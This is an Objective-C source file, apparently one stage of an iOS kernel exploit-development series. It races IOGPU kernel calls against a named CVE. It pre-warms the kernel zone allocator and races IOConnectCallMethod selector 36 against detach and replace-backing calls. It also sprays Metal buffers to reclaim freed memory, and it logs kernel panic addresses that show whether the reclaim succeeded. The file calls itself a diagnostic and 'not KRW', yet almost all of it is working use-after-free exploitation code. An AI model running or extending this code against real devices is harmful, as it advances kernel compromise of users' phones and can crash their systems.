//
//  P020MagazineAwareReclaim.m
//  P007OpenOnly
//
//  p020: magazine-aware reclaim diagnostic for CVE-2026-64788.
//  Mapped onto the same IOGPU/Metal helpers as p014b/p017 (no lumina* names).
//  Not KRW. Panic telemetry is the dataset.
//

#import "P020MagazineAwareReclaim.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/thread_act.h>
#import <mach/thread_policy.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define P020_WARM_LIVE     64
#define P020_WARM_FREED    64
#define P020_RACE_SECONDS  60
#define P020_SPRAY_RING    256
#define P020_SPRAY_LEN     0x400
#define P020_PAGE          0x4000
#define P020_HIST          8

typedef int (*P020Detach_t)(void *);
typedef int (*P020Replace_t)(void *, void *, uint64_t);
typedef uint32_t (*P020GetType_t)(void *);
typedef uint32_t (*P020GetConn_t)(void *);
typedef kern_return_t (*P020Iocall_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);

typedef struct {
    unsigned kr;
    unsigned long long n;
} p020_kh;

typedef struct {
    uint64_t v;
    unsigned long long n;
} p020_oh;

static NSMutableString *p020_buf;
static int p020_fd = -1;

static void p020_log(const char *fmt, ...)
{
    char lb[800];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(lb, sizeof(lb) - 1, fmt, ap);
    va_end(ap);
    if (n < 0)
        return;
    if (n > (int)sizeof(lb) - 2)
        n = (int)sizeof(lb) - 2;
    lb[n++] = '\n';
    lb[n] = 0;
    @synchronized ([NSString class]) {
        if (p020_buf)
            [p020_buf appendFormat:@"%.*s", n, lb];
        if (p020_fd >= 0) {
            write(p020_fd, lb, (size_t)n);
            fcntl(p020_fd, F_FULLFSYNC);
        }
    }
}

static NSString *p020_finish(void)
{
    if (p020_fd >= 0) {
        fcntl(p020_fd, F_FULLFSYNC);
        close(p020_fd);
        p020_fd = -1;
    }
    return p020_buf ?: @"STOP: no log";
}

static const char *p020_kr(kern_return_t r)
{
    unsigned u = (unsigned)r;
    if (r == 0)
        return "SUCCESS";
    if (u == 0xe00002c2)
        return "BadArgument";
    if (u == 0xe00002bc)
        return "Error";
    if (u == 0xe00002c7)
        return "Unsupported";
    if (u == 0xe00002e2)
        return "NotPermitted";
    if (u == 0xe00002c9)
        return "NotAttached";
    return "?";
}

static id p020_unwrap(id buf)
{
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL s = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:s])
            break;
        id b = ((id (*)(id, SEL))objc_msgSend)(buf, s);
        if (!b || b == buf)
            break;
        buf = b;
    }
    return buf;
}

static void *p020_ref(id buf)
{
    buf = p020_unwrap(buf);
    SEL s = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:s])
        return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, s);
}

static void *p020_ivar(id obj, const char *name)
{
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static void *p020_strip(void *p)
{
    return (void *)((uintptr_t)p & 0x0000007FFFFFFFFFULL);
}

static int p020_is_heap(void *p)
{
    uintptr_t x = (uintptr_t)p020_strip(p);
    if (x < 0x100000000ULL)
        return 0;
    if ((x & 7) != 0)
        return 0;
    if ((x >> 28) == 0x16)
        return 0;
    return 1;
}

static uint32_t p020_res_id(void *res)
{
    if (!res)
        return 0;
    return *(uint32_t *)((uint8_t *)res + 0x30);
}

static uint32_t p020_res_conn(void *res)
{
    if (!res)
        return 0;
    void *devw = p020_strip(*(void **)((uint8_t *)res + 0x10));
    if (!p020_is_heap(devw))
        return 0;
    return *(uint32_t *)((uint8_t *)devw + 0x14);
}

static void p020_hist_kr(p020_kh *h, unsigned kr)
{
    @synchronized ([NSString class]) {
        for (int i = 0; i < P020_HIST; i++) {
            if (h[i].n && h[i].kr == kr) {
                h[i].n++;
                return;
            }
            if (h[i].n == 0) {
                h[i].kr = kr;
                h[i].n = 1;
                return;
            }
        }
        h[P020_HIST - 1].n++;
    }
}

static void p020_hist_out(p020_oh *h, uint64_t v)
{
    @synchronized ([NSString class]) {
        for (int i = 0; i < P020_HIST; i++) {
            if (h[i].n && h[i].v == v) {
                h[i].n++;
                return;
            }
            if (h[i].n == 0) {
                h[i].v = v;
                h[i].n = 1;
                return;
            }
        }
        h[P020_HIST - 1].n++;
    }
}

static int p020_nsout(p020_oh *h)
{
    int n = 0;
    for (int i = 0; i < P020_HIST && h[i].n; i++)
        n++;
    return n;
}

static void p020_pin(int tag)
{
    thread_affinity_policy_data_t pol;
    pol.affinity_tag = tag;
    (void)thread_policy_set(pthread_mach_thread_np(pthread_self()),
                            THREAD_AFFINITY_POLICY,
                            (thread_policy_t)&pol,
                            THREAD_AFFINITY_POLICY_COUNT);
}

/* bytesNoCopy type-0x80 SysMemory. vm size is page-aligned; visible length may be smaller. */
static id p020_create80(id dev, P020GetType_t getType, vm_size_t vmsz, NSUInteger len,
                        vm_address_t *out_pg, void **out_ref)
{
    *out_pg = 0;
    *out_ref = NULL;
    vm_address_t pg = 0;
    if (vm_allocate(mach_task_self(), &pg, vmsz, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pg)
        return nil;
    size_t fill = (size_t)len;
    if (fill > (size_t)vmsz)
        fill = (size_t)vmsz;
    memset((void *)(uintptr_t)pg, 0xEE, fill);
    id buf = [dev newBufferWithBytesNoCopy:(void *)(uintptr_t)pg
                                    length:len
                                   options:MTLResourceStorageModeShared
                               deallocator:^(void *p, NSUInteger n) {
                                   (void)p;
                                   (void)n;
                               }];
    void *r = buf ? p020_ref(buf) : NULL;
    uint32_t t = (r && getType) ? getType(r) : 0;
    if (!buf || !r || t != 0x80) {
        buf = nil;
        vm_deallocate(mach_task_self(), pg, vmsz);
        return nil;
    }
    *out_pg = pg;
    *out_ref = r;
    return buf;
}

static void p020_drop(id *buf, vm_address_t *pg, vm_size_t psz)
{
    *buf = nil;
    if (*pg) {
        vm_deallocate(mach_task_self(), *pg, psz);
        *pg = 0;
    }
}

typedef struct {
    void *ref;
    P020Detach_t detach;
    P020Replace_t repl;
    P020Iocall_t iocall;
    mach_port_t conn;
    uint32_t id;
    uint64_t sel_len;
    void *repl_page;
    size_t repl_len;
    __unsafe_unretained id spray_dev;
    P020GetType_t getType;
    atomic_int *stop;
    atomic_ullong *itersA;
    atomic_ullong *itersB;
    atomic_ullong *krSuccess;
    atomic_ullong *krBadArg;
    atomic_ullong *krOther;
    atomic_ullong *det_fail;
    atomic_ullong *rep_fail;
    atomic_ullong *rep_ok;
    atomic_ullong *spray_ok;
    atomic_ullong *spray_fail;
    p020_kh *kh;
    p020_oh *oh;
    uint32_t *live_ids;
    atomic_int *live_n;
} p020_arg;

static void *p020_threadA(void *u)
{
    p020_arg *st = (p020_arg *)u;
    p020_pin(1);
    uint64_t in[3] = { st->id, 0, st->sel_len };
    while (!atomic_load(st->stop)) {
        uint64_t out = 0;
        uint32_t nout = 1;
        kern_return_t kr = st->iocall(st->conn, 36, in, 3, NULL, 0, &out, &nout, NULL, NULL);
        p020_hist_kr(st->kh, (unsigned)kr);
        if (kr == 0) {
            p020_hist_out(st->oh, out);
            atomic_fetch_add(st->krSuccess, 1);
        } else if ((unsigned)kr == 0xe00002c2) {
            atomic_fetch_add(st->krBadArg, 1);
        } else {
            atomic_fetch_add(st->krOther, 1);
        }
        atomic_fetch_add(st->itersA, 1);
    }
    return NULL;
}

static void *p020_threadB(void *u)
{
    p020_arg *st = (p020_arg *)u;
    p020_pin(2);
    NSMutableArray *ring = [NSMutableArray arrayWithCapacity:P020_SPRAY_RING];
    vm_address_t pgs[P020_SPRAY_RING];
    uint32_t ids[P020_SPRAY_RING];
    memset(pgs, 0, sizeof(pgs));
    memset(ids, 0, sizeof(ids));
    int slot = 0;
    while (!atomic_load(st->stop)) {
        @autoreleasepool {
            int dkr = st->detach(st->ref);
            if (dkr != 0) {
                atomic_fetch_add(st->det_fail, 1);
                continue;
            }
            int rkr = st->repl(st->ref, st->repl_page, st->repl_len);
            if (rkr != 0) {
                atomic_fetch_add(st->rep_fail, 1);
                continue;
            }
            atomic_fetch_add(st->rep_ok, 1);

            for (int c = 0; c < 2; c++) {
                vm_address_t pg = 0;
                void *r = NULL;
                id b = p020_create80(st->spray_dev, st->getType, P020_PAGE, P020_SPRAY_LEN, &pg, &r);
                if (!b) {
                    atomic_fetch_add(st->spray_fail, 1);
                    continue;
                }
                if ((int)ring.count == P020_SPRAY_RING) {
                    [ring replaceObjectAtIndex:(NSUInteger)slot withObject:b];
                    if (pgs[slot])
                        vm_deallocate(mach_task_self(), pgs[slot], P020_PAGE);
                } else {
                    [ring addObject:b];
                }
                pgs[slot] = pg;
                ids[slot] = p020_res_id(r);
                slot = (slot + 1) % P020_SPRAY_RING;
                atomic_fetch_add(st->spray_ok, 1);

                vm_address_t pg2 = 0;
                void *r2 = NULL;
                id b2 = p020_create80(st->spray_dev, st->getType, P020_PAGE, P020_SPRAY_LEN, &pg2, &r2);
                if (b2) {
                    b2 = nil;
                    if (pg2)
                        vm_deallocate(mach_task_self(), pg2, P020_PAGE);
                    atomic_fetch_add(st->spray_ok, 1);
                } else {
                    atomic_fetch_add(st->spray_fail, 1);
                }
            }
            atomic_fetch_add(st->itersB, 1);
        }
    }
    int n = (int)ring.count;
    if (n > P020_SPRAY_RING)
        n = P020_SPRAY_RING;
    atomic_store(st->live_n, n);
    for (int i = 0; i < n; i++)
        st->live_ids[i] = ids[i];
    (void)ring;
    return NULL;
}

@implementation P020MagazineAwareReclaim

+ (NSString *)runP020MagazineAwareReclaim
{
    p020_buf = [NSMutableString string];
    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *path = [docs.firstObject stringByAppendingPathComponent:@"p020_magazine_reclaim_log.txt"];
    [[NSFileManager defaultManager] removeItemAtPath:path error:nil];
    p020_fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    p020_log("=== p020 session: magazine-aware reclaim (confused-deputy install attempt) ===");
    p020_log("[*] Two-half magazine: zfree→free, zalloc→alloc, swap on empty/full");
    p020_log("[*] Pre-warm %d (%d live + %d freed), then A=sel36 coreX, B=churn coreY",
             P020_WARM_LIVE + P020_WARM_FREED, P020_WARM_LIVE, P020_WARM_FREED);
    p020_log("[*] %d seconds. Panic PC is the dataset:", P020_RACE_SECONDS);
    p020_log("[*]   0x9857cc8 = free landed, reclaim missed (swap too slow)");
    p020_log("[*]   0x9857cd8 = PAC passed on reclaimed MD — RECLAIM WORKED");
    p020_log("[*]   no panic  = reclaim absorbing frees (silent wins) OR race never last-ref");
    p020_log("[*] Not KRW. Diagnostic only. Mapped to p017 helpers (bytesNoCopy 0x80 / Detach / Replace).");
    fcntl(p020_fd, F_FULLFSYNC);

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu)
        iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iogpu) {
        p020_log("p020 STOP dlopen IOGPU");
        return p020_finish();
    }

    P020Detach_t detach = (P020Detach_t)dlsym(iogpu, "IOGPUResourceDetachBacking");
    P020Replace_t repl = (P020Replace_t)dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    P020GetType_t getType = (P020GetType_t)dlsym(iogpu, "IOGPUResourceGetResourceType");
    P020GetConn_t devConn = (P020GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    P020Iocall_t iocall = iokit ? (P020Iocall_t)dlsym(iokit, "IOConnectCallMethod") : NULL;
    if (!detach || !repl || !iocall || !getType) {
        p020_log("p020 STOP syms detach=%p repl=%p iocall=%p getType=%p", detach, repl, iocall, getType);
        return p020_finish();
    }

    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) {
        p020_log("p020 STOP no device");
        return p020_finish();
    }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) {
        p020_log("p020 STOP no queue");
        return p020_finish();
    }
    id mtlDev = p020_unwrap(dev);
    void *devRef = p020_strip(p020_ivar(mtlDev, "_deviceRef"));
    uint32_t dconn = (devConn && p020_is_heap(devRef)) ? devConn(devRef) : 0;
    p020_log("p020 [0] metal=%s dconn=0x%x", [[dev name] UTF8String], dconn);

    vm_address_t pg = 0, pr = 0;
    void *ref = NULL;
    id buf = p020_create80(dev, getType, P020_PAGE, P020_PAGE, &pg, &ref);
    if (!buf || !ref) {
        p020_log("p020 [0] STOP no type 0x80");
        return p020_finish();
    }
    if (vm_allocate(mach_task_self(), &pr, P020_PAGE, VM_FLAGS_ANYWHERE) != KERN_SUCCESS || !pr) {
        p020_log("p020 [0] STOP replace page");
        return p020_finish();
    }
    memset((void *)(uintptr_t)pr, 0x43, P020_PAGE);

    uint32_t rid = p020_res_id(ref);
    uint32_t rconn = p020_res_conn(ref);
    uint32_t conn = dconn ? dconn : rconn;
    p020_log("p020 [0] type=0x80 id=%u conn=0x%x ref=%p", rid, conn, ref);
    if (!conn || !rid) {
        p020_log("p020 STOP conn/id");
        return p020_finish();
    }
    fcntl(p020_fd, F_FULLFSYNC);

    uint64_t cin[3] = { rid, 0, 0x1000 };
    uint64_t cout = 0;
    uint32_t nout = 1;
    p020_log("p020 [calib] sel36 {id=%u,0,0x1000} — if last line, died on first sel36", rid);
    fcntl(p020_fd, F_FULLFSYNC);
    kern_return_t ckr = iocall(conn, 36, cin, 3, NULL, 0, &cout, &nout, NULL, NULL);
    p020_log("p020 [calib] sel36 kr=0x%x (%s) sout=0x%llx nout=%u",
             (unsigned)ckr, p020_kr(ckr), (unsigned long long)cout, nout);
    fcntl(p020_fd, F_FULLFSYNC);
    if (ckr != 0) {
        p020_log("p020 STOP calib failed");
        return p020_finish();
    }

    const int nwarm = P020_WARM_LIVE + P020_WARM_FREED;
    NSMutableArray *warmLive = [NSMutableArray array];
    vm_address_t warm_pg[P020_WARM_LIVE + P020_WARM_FREED];
    memset(warm_pg, 0, sizeof(warm_pg));
    int created = 0, destroyed = 0;
    for (int i = 0; i < nwarm; i++) {
        vm_address_t wpg = 0;
        void *wr = NULL;
        id wb = p020_create80(dev, getType, P020_PAGE, P020_PAGE, &wpg, &wr);
        if (!wb) {
            p020_log("p020 [warm] create %d FAILED", i);
            continue;
        }
        created++;
        if ((i % 2) == 0) {
            wb = nil;
            if (wpg)
                vm_deallocate(mach_task_self(), wpg, P020_PAGE);
            destroyed++;
        } else {
            [warmLive addObject:wb];
            warm_pg[warmLive.count - 1] = wpg;
        }
    }
    p020_log("p020 [warm] created %d, destroyed %d, live %lu — magazine primed",
             created, destroyed, (unsigned long)warmLive.count);
    fcntl(p020_fd, F_FULLFSYNC);

    p020_kh kh[P020_HIST];
    p020_oh oh[P020_HIST];
    memset(kh, 0, sizeof(kh));
    memset(oh, 0, sizeof(oh));
    atomic_int stop = 0;
    atomic_ullong ia = 0, ib = 0;
    atomic_ullong k0 = 0, k2c2 = 0, koth = 0;
    atomic_ullong det_fail = 0, rep_ok = 0, rep_fail = 0, sok = 0, sfail = 0;
    uint32_t live_ids[P020_SPRAY_RING];
    memset(live_ids, 0, sizeof(live_ids));
    atomic_int live_n = 0;

    p020_arg a;
    memset(&a, 0, sizeof(a));
    a.ref = ref;
    a.detach = detach;
    a.repl = repl;
    a.iocall = iocall;
    a.conn = conn;
    a.id = rid;
    a.sel_len = 0x1000;
    a.repl_page = (void *)(uintptr_t)pr;
    a.repl_len = P020_PAGE;
    a.spray_dev = dev;
    a.getType = getType;
    a.stop = &stop;
    a.itersA = &ia;
    a.itersB = &ib;
    a.krSuccess = &k0;
    a.krBadArg = &k2c2;
    a.krOther = &koth;
    a.det_fail = &det_fail;
    a.rep_fail = &rep_fail;
    a.rep_ok = &rep_ok;
    a.spray_ok = &sok;
    a.spray_fail = &sfail;
    a.kh = kh;
    a.oh = oh;
    a.live_ids = live_ids;
    a.live_n = &live_n;
    p020_arg b = a;

    p020_log("p020 [phase1] START %ds A=sel36(coreX) B=churn(coreY)", P020_RACE_SECONDS);
    fcntl(p020_fd, F_FULLFSYNC);

    pthread_t tA, tB;
    if (pthread_create(&tA, NULL, p020_threadA, &a) != 0 ||
        pthread_create(&tB, NULL, p020_threadB, &b) != 0) {
        atomic_store(&stop, 1);
        p020_log("p020 STOP pthread");
        return p020_finish();
    }

    NSDate *t0 = [NSDate date];
    while (-[t0 timeIntervalSinceNow] < (NSTimeInterval)P020_RACE_SECONDS) {
        sleep(5);
        p020_log("p020 [phase1] t=%.0fs itersA=%llu itersB=%llu kr={0x0:%llu 2c2:%llu other:%llu} souts=%d spray_ok=%llu spray_fail=%llu det_fail=%llu rep_ok=%llu",
                 -[t0 timeIntervalSinceNow],
                 (unsigned long long)atomic_load(&ia),
                 (unsigned long long)atomic_load(&ib),
                 (unsigned long long)atomic_load(&k0),
                 (unsigned long long)atomic_load(&k2c2),
                 (unsigned long long)atomic_load(&koth),
                 p020_nsout(oh),
                 (unsigned long long)atomic_load(&sok),
                 (unsigned long long)atomic_load(&sfail),
                 (unsigned long long)atomic_load(&det_fail),
                 (unsigned long long)atomic_load(&rep_ok));
        fcntl(p020_fd, F_FULLFSYNC);
    }

    atomic_store(&stop, 1);
    pthread_join(tA, NULL);
    pthread_join(tB, NULL);

    int nlive = atomic_load(&live_n);
    p020_log("p020 [phase2] spray[0..%d] sel36 {id,0,8}", nlive);
    fcntl(p020_fd, F_FULLFSYNC);
    int died = 0;
    for (int i = 0; i < nlive; i++) {
        uint64_t sin[3] = { live_ids[i], 0, 8 };
        uint64_t sout = 0;
        uint32_t nso = 1;
        p020_log("p020 [phase2] spray[%d] id=%u — if last line, died on this IOMD", i, live_ids[i]);
        fcntl(p020_fd, F_FULLFSYNC);
        kern_return_t skr = iocall(conn, 36, sin, 3, NULL, 0, &sout, &nso, NULL, NULL);
        p020_log("p020 [phase2] spray[%d] sel36 -> kr=0x%x (%s) sout=0x%llx",
                 i, (unsigned)skr, p020_kr(skr), (unsigned long long)sout);
        fcntl(p020_fd, F_FULLFSYNC);
        if (skr != 0) {
            p020_log("p020 [phase2] spray[%d] id=%u NOT SUCCESS", i, live_ids[i]);
            died = 1;
            break;
        }
    }

    if (died)
        p020_log("p020 verdict: phase2 spray died. Extra-release still expected dead (fn4 old=0). Paste ips. Not KRW.");
    else if (atomic_load(&ia) == 0)
        p020_log("p020 verdict: SURVIVED but itersA=0. Probe did not run sel36.");
    else
        p020_log("p020 verdict: SURVIVED %ds. itersA=%llu itersB=%llu souts=%d. SURVIVED means no panic — reclaim may have absorbed frees (silent wins) OR last-ref never hit. Panic 0x9857cc8 = swap too slow. Panic 0x9857cd8 = PAC passed on reclaimed MD (RECLAIM WORKED). Not KRW.",
                 P020_RACE_SECONDS,
                 (unsigned long long)atomic_load(&ia),
                 (unsigned long long)atomic_load(&ib),
                 p020_nsout(oh));
    fcntl(p020_fd, F_FULLFSYNC);

    (void)q;
    (void)buf;
    (void)warmLive;
    vm_deallocate(mach_task_self(), pg, P020_PAGE);
    vm_deallocate(mach_task_self(), pr, P020_PAGE);
    for (NSUInteger i = 0; i < warmLive.count; i++) {
        if (warm_pg[i])
            vm_deallocate(mach_task_self(), warm_pg[i], P020_PAGE);
    }
    return p020_finish();
}

@end
